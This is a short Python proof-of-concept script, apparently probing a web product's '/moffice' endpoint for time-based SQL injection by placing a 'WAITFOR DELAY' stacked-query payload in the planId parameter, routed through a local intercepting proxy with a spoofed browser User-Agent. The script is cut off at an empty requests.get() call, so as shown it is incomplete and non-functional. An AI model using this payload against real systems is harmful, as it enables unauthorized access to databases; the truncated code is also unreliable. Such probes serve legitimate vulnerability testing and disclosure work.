
import requests

proxies = {
    'http':'http://127.0.0.1:8080',
    'https':'https://127.0.0.1:8080',
}
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
}

def poc(url):
    bug_url = url+r"/moffice?op=showWorkPlan&planId=1';WAITFOR+DELAY+'0:0:5'--&sid=1"
    rep1 = requests.get()